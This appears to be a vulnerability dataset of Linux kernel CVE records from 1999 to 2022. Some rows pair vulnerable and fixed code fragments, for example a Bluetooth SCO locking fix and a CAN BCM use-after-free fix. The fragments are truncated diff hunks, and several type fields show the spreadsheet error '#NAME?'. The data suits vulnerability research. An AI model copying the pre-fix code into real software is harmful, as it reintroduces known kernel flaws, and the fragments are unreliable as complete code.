 * DO_SAVE_MIN switches to the kernel stacks (if necessary) and saves
 * the minimum state necessary that allows us to turn psr.ic back
 * Note that psr.ic is NOT turned on by this macro.  This is so that
 * we can pass interruption state as arguments to a handler.
 */
#define DO_SAVE_MIN(COVER,SAVE_IFS,EXTRA)							\
	mov r16=IA64_KR(CURRENT);	/* M */							\
	mov r27=ar.rsc;			/* M */							\
	mov r20=r1;			/* A */							\
	tbit.nz p15,p0=r29,IA64_PSR_I_BIT;							\
	mov r29=b0										\
	;;											\

	adds r16=PT(R8),r1;	/* initialize first base pointer */				\
	adds r17=PT(R9),r1;	/* initialize second base pointer */				\
(pKStk)	mov r18=r0;		/* make sure r18 isn't NaT */					\
	st8 [r25]=r10;      	/* ar.ssd */	\
	;;

#define SAVE_MIN_WITH_COVER DO_SAVE_MIN(cover, mov r30=cr.ifs,)
#define SAVE_MIN_WITH_COVER_R19 DO_SAVE_MIN(cover, mov r30=cr.ifs, mov r15=r19)
#define SAVE_MIN DO_SAVE_MIN(     , mov r30=r0, )


































 ia64_srlz_i();
}
























void __init
ia64_patch_mckinley_e9 (unsigned long start, unsigned long end)
{
 /* process SAL system table: */
 ia64_sal_init(__va(efi.sal_systab));












#ifdef CONFIG_SMP
 cpu_physical_id(0) = hard_smp_processor_id();
#endif
 __end___vtop_patchlist = .;
	}








 .data.patch.mckinley_e9 : AT(ADDR(.data.patch.mckinley_e9) - LOAD_OFFSET)
	{
 __start___mckinley_e9_bundles = .;
extern void ia64_patch_mckinley_e9 (unsigned long start, unsigned long end);
extern void ia64_patch_vtop (unsigned long start, unsigned long end);
extern void ia64_patch_phys_stack_reg(unsigned long val);

extern void ia64_patch_gate (void);

#endif /* _ASM_IA64_PATCH_H */
# define KERNEL_STACK_SIZE_ORDER 0
#endif

#define IA64_RBS_OFFSET			((IA64_TASK_SIZE + IA64_THREAD_INFO_SIZE + 15) & ~15)
#define IA64_STK_OFFSET			((1 << KERNEL_STACK_SIZE_ORDER)*PAGE_SIZE)

#define KERNEL_STACK_SIZE		IA64_STK_OFFSET

extern char __per_cpu_start[], __per_cpu_end[], __phys_per_cpu_start[];
extern char __start___vtop_patchlist[], __end___vtop_patchlist[];

extern char __start___mckinley_e9_bundles[], __end___mckinley_e9_bundles[];
extern char __start___phys_stack_reg_patchlist[], __end___phys_stack_reg_patchlist[];
extern char __start_gate_section[];
","	DBG_FAULT(15)
	FAULT(15)











































 .org ia64_ivt+0x4000
/////////////////////////////////////////////////////////////////////////////////////////
// 0x4000 Entry 16 (size 64 bundles) Reserved
	DBG_FAULT(67)
	FAULT(67)

	/*
	 * Squatting in this space ...
	 *
	 * This special case dispatcher for illegal operation faults allows preserved
	 * registers to be modified through a callback function (asm only) that is handed
	 * back from the fault handler in r8. Up to three arguments can be passed to the
	 * callback function by returning an aggregate with the callback as its first
	 * element, followed by the arguments.
	 */
ENTRY(dispatch_illegal_op_fault)
	.prologue
	.body
	SAVE_MIN_WITH_COVER
	ssm psr.ic | PSR_DEFAULT_BITS
	;;
	srlz.i		// guarantee that interruption collection is on
	;;
(p15)	ssm psr.i	// restore psr.i
	adds r3=8,r2	// set up second base pointer for SAVE_REST
	;;
	alloc r14=ar.pfs,0,0,1,0 // must be first in insn group
 mov out0=ar.ec
	;;
	SAVE_REST
	PT_REGS_UNWIND_INFO(0)
	;;
	br.call.sptk.many rp=ia64_illegal_op_fault
.ret0:	;;
	alloc r14=ar.pfs,0,0,3,0 // must be first in insn group
 mov out0=r9
 mov out1=r10
 mov out2=r11
 movl r15=ia64_leave_kernel
	;;
 mov rp=r15
 mov b6=r8
	;;
 cmp.ne p6,p0=0,r8
(p6)	br.call.dpnt.many b6=b6		// call returns to ia64_leave_kernel
	br.sptk.many ia64_leave_kernel
END(dispatch_illegal_op_fault)

#ifdef CONFIG_IA32_SUPPORT

	/*
#define ACCOUNT_SYS_ENTER
#endif

.section "".data.patch.rse"", ""a""
.previous

/*
 * DO_SAVE_MIN switches to the kernel stacks (if necessary) and saves
 * the minimum state necessary that allows us to turn psr.ic back
 * Note that psr.ic is NOT turned on by this macro.  This is so that
 * we can pass interruption state as arguments to a handler.
 */
#define DO_SAVE_MIN(COVER,SAVE_IFS,EXTRA,WORKAROUND)						\
	mov r16=IA64_KR(CURRENT);	/* M */							\
	mov r27=ar.rsc;			/* M */							\
	mov r20=r1;			/* A */							\
	tbit.nz p15,p0=r29,IA64_PSR_I_BIT;							\
	mov r29=b0										\
	;;											\
	WORKAROUND;										\
	adds r16=PT(R8),r1;	/* initialize first base pointer */				\
	adds r17=PT(R9),r1;	/* initialize second base pointer */				\
(pKStk)	mov r18=r0;		/* make sure r18 isn't NaT */					\
	st8 [r25]=r10;      	/* ar.ssd */	\
	;;

#define RSE_WORKAROUND				\
(pUStk) extr.u r17=r18,3,6;			\
(pUStk)	sub r16=r18,r22;			\
[1:](pKStk)	br.cond.sptk.many 1f;		\
	.xdata4 "".data.patch.rse"",1b-.		\
	;;					\
	cmp.ge p6,p7 = 33,r17;			\
	;;					\
(p6)	mov r17=0x310;				\
(p7)	mov r17=0x308;				\
	;;					\
	cmp.leu p1,p0=r16,r17;			\
(p1)	br.cond.sptk.many 1f;			\
	dep.z r17=r26,0,62;			\
	movl r16=2f;				\
	;;					\
	mov ar.pfs=r17;				\
	dep r27=r0,r27,16,14;			\
	mov b0=r16;				\
	;;					\
	br.ret.sptk b0;				\
	;;					\
2:						\
	mov ar.rsc=r0				\
	;;					\
	flushrs;				\
	;;					\
	mov ar.bspstore=r22			\
	;;					\
	mov r18=ar.bsp;				\
	;;					\
1:						\
	.pred.rel ""mutex"", pKStk, pUStk

#define SAVE_MIN_WITH_COVER DO_SAVE_MIN(cover, mov r30=cr.ifs, , RSE_WORKAROUND)
#define SAVE_MIN_WITH_COVER_R19 DO_SAVE_MIN(cover, mov r30=cr.ifs, mov r15=r19, RSE_WORKAROUND)
#define SAVE_MIN DO_SAVE_MIN(     , mov r30=r0, , )
 ia64_srlz_i();
}

/*
 * Disable the RSE workaround by turning the conditional branch
 * that we tagged in each place the workaround was used into an
 * unconditional branch.
 */
void __init
ia64_patch_rse (unsigned long start, unsigned long end)
{
	s32 *offp = (s32 *) start;
	u64 ip, *b;

 while (offp < (s32 *) end) {
		ip = (u64) offp + *offp;

		b = (u64 *)(ip & -16);
		b[1] &= ~0xf800000L;
 ia64_fc((void *) ip);
		++offp;
	}
 ia64_sync_i();
 ia64_srlz_i();
}

void __init
ia64_patch_mckinley_e9 (unsigned long start, unsigned long end)
{
 /* process SAL system table: */
 ia64_sal_init(__va(efi.sal_systab));

#ifdef CONFIG_ITANIUM
 ia64_patch_rse((u64) __start___rse_patchlist, (u64) __end___rse_patchlist);
#else
	{
		u64 num_phys_stacked;

 if (ia64_pal_rse_info(&num_phys_stacked, 0) == 0 && num_phys_stacked > 96)
 ia64_patch_rse((u64) __start___rse_patchlist, (u64) __end___rse_patchlist);
	}
#endif

#ifdef CONFIG_SMP
 cpu_physical_id(0) = hard_smp_processor_id();
#endif
 __end___vtop_patchlist = .;
	}

 .data.patch.rse : AT(ADDR(.data.patch.rse) - LOAD_OFFSET)
	{
 __start___rse_patchlist = .;
	  *(.data.patch.rse)
 __end___rse_patchlist = .;
	}

 .data.patch.mckinley_e9 : AT(ADDR(.data.patch.mckinley_e9) - LOAD_OFFSET)
	{
 __start___mckinley_e9_bundles = .;
extern void ia64_patch_mckinley_e9 (unsigned long start, unsigned long end);
extern void ia64_patch_vtop (unsigned long start, unsigned long end);
extern void ia64_patch_phys_stack_reg(unsigned long val);
extern void ia64_patch_rse (unsigned long start, unsigned long end);
extern void ia64_patch_gate (void);

#endif /* _ASM_IA64_PATCH_H */
# define KERNEL_STACK_SIZE_ORDER 0
#endif

#define IA64_RBS_OFFSET			((IA64_TASK_SIZE + IA64_THREAD_INFO_SIZE + 31) & ~31)
#define IA64_STK_OFFSET			((1 << KERNEL_STACK_SIZE_ORDER)*PAGE_SIZE)

#define KERNEL_STACK_SIZE		IA64_STK_OFFSET

extern char __per_cpu_start[], __per_cpu_end[], __phys_per_cpu_start[];
extern char __start___vtop_patchlist[], __end___vtop_patchlist[];
extern char __start___rse_patchlist[], __end___rse_patchlist[];
extern char __start___mckinley_e9_bundles[], __end___mckinley_e9_bundles[];
extern char __start___phys_stack_reg_patchlist[], __end___phys_stack_reg_patchlist[];
extern char __start_gate_section[];
"
2006,DoS ,CVE-2006-3634,,
2006,#NAME?,CVE-2006-3626,,
2006,DoS ,CVE-2006-3468,,
2006,DoS ,CVE-2006-3085,,
2006,DoS ,CVE-2006-2936,,
2006,Exec Code Overflow ,CVE-2006-2935,,
2006,DoS ,CVE-2006-2934,,
2006,DoS Mem. Corr. ,CVE-2006-2629,,
2006,DoS +Priv ,CVE-2006-2451,,
2006,DoS ,CVE-2006-2448,,
2006,DoS ,CVE-2006-2446,,
2006,DoS ,CVE-2006-2445,,
2006,DoS ,CVE-2006-2444,,
2006,Bypass ,CVE-2006-2071,,
2006,Dir. Trav. ,CVE-2006-1864,,
2006,Dir. Trav. ,CVE-2006-1863,,
2006,DoS ,CVE-2006-1862,,
2006,DoS ,CVE-2006-1860,,
2006,DoS ,CVE-2006-1859,,
2006,DoS Exec Code ,CVE-2006-1858,,
2006,DoS Exec Code Overflow ,CVE-2006-1857,,
2006,Bypass ,CVE-2006-1856,,
2006,DoS ,CVE-2006-1855,,
2006,DoS ,CVE-2006-1624,,
2006,DoS ,CVE-2006-1528,,
2006,DoS ,CVE-2006-1527,,
2006,DoS ,CVE-2006-1525,,
2006,Bypass ,CVE-2006-1524,,
2006,,CVE-2006-1523,,
2006,DoS ,CVE-2006-1522,,
2006,DoS Overflow Mem. Corr. ,CVE-2006-1368,,
2006,,CVE-2006-1343,,
2006,,CVE-2006-1342,,
2006,Bypass ,CVE-2006-1242,,
2006,DoS ,CVE-2006-1066,,
2006,#NAME?,CVE-2006-1056,,
2006,DoS ,CVE-2006-1055,,
2006,,CVE-2006-1052,,
2006,,CVE-2006-0744,,
2006,DoS ,CVE-2006-0742,,
2006,DoS ,CVE-2006-0741,,
2006,DoS ,CVE-2006-0558,,
2006,,CVE-2006-0557,,
2006,DoS ,CVE-2006-0555,,
2006,#NAME?,CVE-2006-0554,,
2006,DoS ,CVE-2006-0482,,
2006,DoS ,CVE-2006-0457,,
2006,DoS ,CVE-2006-0456,,
2006,DoS ,CVE-2006-0454,,
2006,,CVE-2006-0096,,
2006,#NAME?,CVE-2006-0095,,
2006,,CVE-2006-0039,,
2006,Overflow ,CVE-2006-0038,,
2006,DoS Mem. Corr. ,CVE-2006-0037,,
2006,DoS Mem. Corr. ,CVE-2006-0036,,
2006,DoS ,CVE-2006-0035,,
2010,DoS ,CVE-2005-4886,,
2009,#NAME?,CVE-2005-4881,,
2005,DoS ,CVE-2005-4811,,
2005,DoS Overflow ,CVE-2005-4798,,
2005,DoS Exec Code Overflow ,CVE-2005-4639,,
2005,DoS ,CVE-2005-4635,,
2005,DoS Overflow ,CVE-2005-4618,,
2005,,CVE-2005-4605,,
2005,Bypass ,CVE-2005-4352,,
2005,Bypass ,CVE-2005-4351,,
2005,DoS ,CVE-2005-3858,,
2005,DoS ,CVE-2005-3857,,
2005,DoS ,CVE-2005-3848,,
2005,DoS ,CVE-2005-3847,,
2005,DoS ,CVE-2005-3810,,
2005,DoS ,CVE-2005-3809,,
2005,DoS Overflow ,CVE-2005-3808,,
2005,DoS ,CVE-2005-3807,,
2005,DoS ,CVE-2005-3806,,
2005,DoS ,CVE-2005-3805,,
2005,DoS +Priv ,CVE-2005-3784,,
2005,DoS ,CVE-2005-3783,,
2005,DoS ,CVE-2005-3753,,
2005,DoS ,CVE-2005-3660,,
2005,Bypass ,CVE-2005-3623,,
2005,DoS ,CVE-2005-3527,,
2005,DoS ,CVE-2005-3359,,
2005,DoS ,CVE-2005-3358,,
2005,DoS ,CVE-2005-3356,,
2005,#NAME?,CVE-2005-3276,,
2005,DoS Mem. Corr. ,CVE-2005-3275,,
2005,DoS ,CVE-2005-3274,,
2005,,CVE-2005-3273,,
2005,,CVE-2005-3272,,
2005,DoS ,CVE-2005-3271,,
2005,#NAME?,CVE-2005-3257,,
2005,DoS ,CVE-2005-3181,,
2005,#NAME?,CVE-2005-3180,,
2005,#NAME?,CVE-2005-3179,,
2005,DoS ,CVE-2005-3119,,
2005,DoS ,CVE-2005-3110,,
2005,DoS ,CVE-2005-3109,,
2005,DoS +Info ,CVE-2005-3108,,
2005,DoS ,CVE-2005-3107,,
2005,DoS ,CVE-2005-3106,,
2005,DoS ,CVE-2005-3105,,
2005,DoS ,CVE-2005-3055,,
2005,DoS ,CVE-2005-3053,,
2005,DoS ,CVE-2005-3044,,
2005,DoS ,CVE-2005-2973,,
2005,,CVE-2005-2873,,
2005,DoS ,CVE-2005-2872,,
2005,,CVE-2005-2801,,
2005,DoS ,CVE-2005-2800,,
2005,DoS Exec Code ,CVE-2005-2709,,
2005,DoS ,CVE-2005-2708,,
2005,,CVE-2005-2617,,
2005,,CVE-2005-2555,,
2005,DoS ,CVE-2005-2553,,
2005,DoS ,CVE-2005-2548,,
2005,DoS Exec Code Overflow ,CVE-2005-2500,,
2005,DoS ,CVE-2005-2492,,
2005,Exec Code Overflow ,CVE-2005-2490,,
2005,DoS ,CVE-2005-2459,,
2005,DoS ,CVE-2005-2458,,
2005,DoS ,CVE-2005-2457,,
2005,DoS Exec Code Overflow ,CVE-2005-2456,,
2005,DoS ,CVE-2005-2099,,
2005,DoS ,CVE-2005-2098,,
2005,DoS ,CVE-2005-1913,,
2005,DoS Exec Code Overflow ,CVE-2005-1768,,
2005,DoS ,CVE-2005-1765,,
2005,DoS ,CVE-2005-1764,,
2005,DoS ,CVE-2005-1762,,
2005,DoS Exec Code ,CVE-2005-1589,,
2005,DoS ,CVE-2005-1369,,
2005,DoS ,CVE-2005-1368,,
2005,DoS ,CVE-2005-1265,,
2005,,CVE-2005-1264,,
2005,Exec Code Overflow ,CVE-2005-1263,,
2005,DoS ,CVE-2005-1041,,
2005,DoS ,CVE-2005-0977,,
2005,,CVE-2005-0937,,
2005,DoS ,CVE-2005-0916,,
2005,Overflow ,CVE-2005-0867,,
2005,#NAME?,CVE-2005-0839,,
2005,DoS ,CVE-2005-0815,,
2005,Exec Code ,CVE-2005-0767,,
2005,DoS ,CVE-2005-0756,,
2005,#NAME?,CVE-2005-0750,,
2005,DoS ,CVE-2005-0749,,
2005,Overflow ,CVE-2005-0736,,
2005,Overflow ,CVE-2005-0532,,
2005,Overflow ,CVE-2005-0531,,
2005,,CVE-2005-0530,,
2005,Overflow ,CVE-2005-0529,,
2005,Exec Code Overflow ,CVE-2005-0504,,
2005,DoS ,CVE-2005-0489,,
2005,DoS Bypass ,CVE-2005-0449,,
2005,#NAME?,CVE-2005-0400,,
2005,DoS ,CVE-2005-0210,,
2005,DoS ,CVE-2005-0209,,
2005,DoS ,CVE-2005-0207,,
2005,,CVE-2005-0204,,
2005,Bypass ,CVE-2005-0180,,
2005,DoS Bypass ,CVE-2005-0179,,
2005,DoS ,CVE-2005-0178,,
2005,DoS Overflow ,CVE-2005-0177,,
2005,,CVE-2005-0176,,
2005,DoS ,CVE-2005-0137,,
2005,DoS ,CVE-2005-0136,,
2005,DoS ,CVE-2005-0135,,
2005,DoS Exec Code Overflow ,CVE-2005-0124,,
2005,DoS Exec Code ,CVE-2005-0003,,
2005,Exec Code ,CVE-2005-0001,,
2004,Exec Code Overflow ,CVE-2004-2731,,
2004,DoS ,CVE-2004-2660,,
2004,,CVE-2004-2607,,
2004,#NAME?,CVE-2004-2536,,
2004,DoS ,CVE-2004-2302,,
2004,,CVE-2004-2136,,
2004,,CVE-2004-2135,,
2004,Exec Code Overflow ,CVE-2004-2013,,
2004,DoS ,CVE-2004-1335,,
2004,DoS Overflow ,CVE-2004-1334,,
2004,DoS Overflow ,CVE-2004-1333,,
2005,DoS ,CVE-2004-1237,,
2005,Exec Code ,CVE-2004-1235,,
2004,DoS ,CVE-2004-1234,,
2005,Overflow +Priv ,CVE-2004-1151,,
2004,#NAME?,CVE-2004-1144,,
2005,DoS Exec Code ,CVE-2004-1137,,
2005,DoS ,CVE-2004-1074,,
2005,,CVE-2004-1073,,
2005,DoS Exec Code Overflow ,CVE-2004-1072,,
2005,Exec Code ,CVE-2004-1071,,
2005,Exec Code ,CVE-2004-1070,,
2005,DoS ,CVE-2004-1069,,
2005,#NAME?,CVE-2004-1068,,
2005,,CVE-2004-1058,,
2005,DoS ,CVE-2004-1057,,
2005,DoS ,CVE-2004-1056,,
2004,Overflow ,CVE-2004-1017,,
2005,DoS ,CVE-2004-1016,,
2004,#NAME?,CVE-2004-0997,,
2005,,CVE-2004-0986,,
2005,,CVE-2004-0949,,
2005,#NAME?,CVE-2004-0887,,
2005,DoS ,CVE-2004-0883,,
2004,DoS ,CVE-2004-0816,,
2004,DoS ,CVE-2004-0814,,
2005,DoS Exec Code ,CVE-2004-0812,,
2004,#NAME?,CVE-2004-0685,,
2004,DoS Exec Code Overflow ,CVE-2004-0658,,
2004,DoS ,CVE-2004-0626,,
2004,DoS ,CVE-2004-0596,,
2004,#NAME?,CVE-2004-0565,,
2004,DoS ,CVE-2004-0554,,
2004,Overflow ,CVE-2004-0535,,
2004,,CVE-2004-0497,,
2004,#NAME?,CVE-2004-0496,,
2004,#NAME?,CVE-2004-0495,,
2004,DoS ,CVE-2004-0447,,
2004,DoS ,CVE-2004-0427,,
2004,DoS Exec Code Overflow ,CVE-2004-0424,,
2004,,CVE-2004-0415,,
2004,Overflow ,CVE-2004-0394,,
2004,,CVE-2004-0229,,
2004,#NAME?,CVE-2004-0228,,
2004,#NAME?,CVE-2004-0186,,
2004,#NAME?,CVE-2004-0181,,
2004,DoS ,CVE-2004-0178,,
2004,#NAME?,CVE-2004-0177,,
2004,DoS ,CVE-2004-0138,,
2004,#NAME?,CVE-2004-0133,,
2004,Exec Code Overflow ,CVE-2004-0109,,
2004,DoS ,CVE-2004-0075,,
2004,,CVE-2004-0058,,
2004,Overflow +Priv ,CVE-2004-0010,,
2004,#NAME?,CVE-2004-0003,,
2004,#NAME?,CVE-2004-0001,,
2016,DoS ,CVE-2003-1604,,
2003,Bypass ,CVE-2003-1161,,
2004,DoS ,CVE-2003-1040,,
2003,DoS ,CVE-2003-0986,,
2004,DoS +Priv ,CVE-2003-0985,,
2004,,CVE-2003-0984,,
2003,Overflow +Priv ,CVE-2003-0961,,
2003,DoS Overflow +Priv ,CVE-2003-0959,,
2003,,CVE-2003-0956,,
2003,DoS ,CVE-2003-0643,,
2003,DoS ,CVE-2003-0619,,
2003,#NAME?,CVE-2003-0501,,
2003,,CVE-2003-0476,,
2003,DoS ,CVE-2003-0467,,
2003,#NAME?,CVE-2003-0465,,
2003,DoS ,CVE-2003-0462,,
2003,,CVE-2003-0418,,
2003,#NAME?,CVE-2003-0246,,
2003,DoS ,CVE-2003-0244,,
2003,DoS ,CVE-2003-0187,,
2003,#NAME?,CVE-2003-0127,,
2003,,CVE-2003-0018,,
2003,#NAME?,CVE-2003-0001,,
2021,,CVE-2002-2438,,
2002,,CVE-2002-2254,,
2002,,CVE-2002-1976,,
2002,DoS ,CVE-2002-1963,,
2004,Overflow ,CVE-2002-1574,,
2002,,CVE-2002-1573,,
2002,Overflow ,CVE-2002-1572,,
2002,#NAME?,CVE-2002-1571,,
2002,DoS ,CVE-2002-1380,,
2002,DoS ,CVE-2002-1319,,
2002,,CVE-2002-0704,,
2002,,CVE-2002-0570,,
2002,,CVE-2002-0510,,
2002,,CVE-2002-0499,,
2002,,CVE-2002-0429,,
2002,Bypass ,CVE-2002-0060,,
2002,,CVE-2002-0046,,
2001,Bypass ,CVE-2001-1572,,
2001,,CVE-2001-1551,,
2001,DoS ,CVE-2001-1400,,
2001,,CVE-2001-1399,,
2001,,CVE-2001-1398,,
2001,,CVE-2001-1397,,
2001,,CVE-2001-1396,,
2001,,CVE-2001-1395,,
2001,DoS ,CVE-2001-1394,,
2001,DoS ,CVE-2001-1393,,
2001,,CVE-2001-1392,,
2001,,CVE-2001-1391,,
2001,,CVE-2001-1390,,
2001,#NAME?,CVE-2001-1384,,
2001,DoS ,CVE-2001-1273,,
2001,DoS ,CVE-2001-1244,,
2001,Bypass ,CVE-2001-1056,,
2001,DoS ,CVE-2001-0914,,
2001,DoS ,CVE-2001-0907,,
2001,Bypass ,CVE-2001-0851,,
2001,Bypass ,CVE-2001-0405,,
2001,#NAME?,CVE-2001-0317,,
2001,#NAME?,CVE-2001-0316,,
2000,DoS +Priv ,CVE-2000-0506,,
2000,DoS ,CVE-2000-0344,,
2000,,CVE-2000-0289,,
2000,DoS ,CVE-2000-0227,,
1999,,CVE-2000-0006,,
1998,DoS ,CVE-1999-1442,,
1998,DoS ,CVE-1999-1441,,
1999,#NAME?,CVE-1999-1352,,
1999,,CVE-1999-1341,,
1999,DoS ,CVE-1999-1339,,
1998,DoS ,CVE-1999-1285,,
1998,#NAME?,CVE-1999-1276,,
1997,,CVE-1999-1225,,
1999,#NAME?,CVE-1999-1166,,
1999,Bypass ,CVE-1999-1018,,
1999,DoS ,CVE-1999-0986,,
1999,DoS ,CVE-1999-0804,,
1998,,CVE-1999-0782,,
1998,Exec Code ,CVE-1999-0781,,
1998,,CVE-1999-0780,,
1999,,CVE-1999-0720,,
1999,,CVE-1999-0656,,
1997,,CVE-1999-0628,,
2000,,CVE-1999-0590,,
1997,#NAME?,CVE-1999-0524,,
1998,DoS ,CVE-1999-0513,,
1999,,CVE-1999-0461,,
1999,DoS Overflow ,CVE-1999-0460,,
1999,DoS ,CVE-1999-0451,,
1999,DoS ,CVE-1999-0431,,
1999,,CVE-1999-0414,,
1999,,CVE-1999-0401,,
1999,DoS ,CVE-1999-0400,,
1999,Overflow ,CVE-1999-0381,,
1996,,CVE-1999-0335,,
1998,Overflow ,CVE-1999-0330,,
1999,Overflow ,CVE-1999-0317,,
1998,DoS ,CVE-1999-0257,,
1995,,CVE-1999-0245,,
1997,DoS ,CVE-1999-0216,,
1997,DoS ,CVE-1999-0195,,
1997,,CVE-1999-0183,,
1997,DoS ,CVE-1999-0171,,
1997,,CVE-1999-0165,,
1996,,CVE-1999-0138,,
1996,DoS ,CVE-1999-0128,,
1997,,CVE-1999-0074,,
1997,,CVE-1999-0061,,
2009,DoS Overflow ,CVE-2009-3288,,
2008,DoS Overflow ,CVE-2007-6712,,
2022,,CVE-2022-0742,,
2022,DoS ,CVE-2022-0322,,
2022,,CVE-2021-45868,,
2022,#NAME?,CVE-2021-4203,,
2022,,CVE-2021-4197,,
2022,DoS ,CVE-2021-4150,,
2022,DoS ,CVE-2021-4149,,
2022,,CVE-2021-3640," return err;
}

static int sco_send_frame(struct sock *sk, struct msghdr *msg, int len)

{
 struct sco_conn *conn = sco_pi(sk)->conn;
 struct sk_buff *skb;

 BT_DBG(""sk %p len %d"", sk, len);

	skb = bt_skb_send_alloc(sk, len, msg->msg_flags & MSG_DONTWAIT, &err);
 if (!skb)
 return err;

 if (memcpy_from_msg(skb_put(skb, len), msg, len)) {
 kfree_skb(skb);
 return -EFAULT;
	}

 hci_send_sco(conn->hcon, skb);

 return len;
 size_t len)
{
 struct sock *sk = sock->sk;

 int err;

 BT_DBG(""sock %p, sk %p"", sock, sk);
 if (msg->msg_flags & MSG_OOB)
 return -EOPNOTSUPP;










 lock_sock(sk);

 if (sk->sk_state == BT_CONNECTED)
		err = sco_send_frame(sk, msg, len);
 else
		err = -ENOTCONN;

 release_sock(sk);

 return err;
}

"," return err;
}

static int sco_send_frame(struct sock *sk, void *buf, int len,
 unsigned int msg_flags)
{
 struct sco_conn *conn = sco_pi(sk)->conn;
 struct sk_buff *skb;

 BT_DBG(""sk %p len %d"", sk, len);

	skb = bt_skb_send_alloc(sk, len, msg_flags & MSG_DONTWAIT, &err);
 if (!skb)
 return err;

 memcpy(skb_put(skb, len), buf, len);




 hci_send_sco(conn->hcon, skb);

 return len;
 size_t len)
{
 struct sock *sk = sock->sk;
 void *buf;
 int err;

 BT_DBG(""sock %p, sk %p"", sock, sk);
 if (msg->msg_flags & MSG_OOB)
 return -EOPNOTSUPP;

	buf = kmalloc(len, GFP_KERNEL);
 if (!buf)
 return -ENOMEM;

 if (memcpy_from_msg(buf, msg, len)) {
 kfree(buf);
 return -EFAULT;
	}

 lock_sock(sk);

 if (sk->sk_state == BT_CONNECTED)
		err = sco_send_frame(sk, buf, len, msg->msg_flags);
 else
		err = -ENOTCONN;

 release_sock(sk);
 kfree(buf);
 return err;
}

"
2022,,CVE-2021-3609,"						  bcm_rx_handler, op);

 list_del(&op->list);

 bcm_remove_op(op);
 return 1; /* done */
		}
 REGMASK(op->can_id),
					  bcm_rx_handler, op);

 bcm_remove_op(op);
	}






#if IS_ENABLED(CONFIG_PROC_FS)
 /* remove procfs entry */
 if (net->can.bcmproc_dir && bo->bcm_proc_read)
","						  bcm_rx_handler, op);

 list_del(&op->list);
 synchronize_rcu();
 bcm_remove_op(op);
 return 1; /* done */
		}
 REGMASK(op->can_id),
					  bcm_rx_handler, op);


	}

 synchronize_rcu();

 list_for_each_entry_safe(op, next, &bo->rx_ops, list)
 bcm_remove_op(op);

#if IS_ENABLED(CONFIG_PROC_FS)
 /* remove procfs entry */
 if (net->can.bcmproc_dir && bo->bcm_proc_read)
"
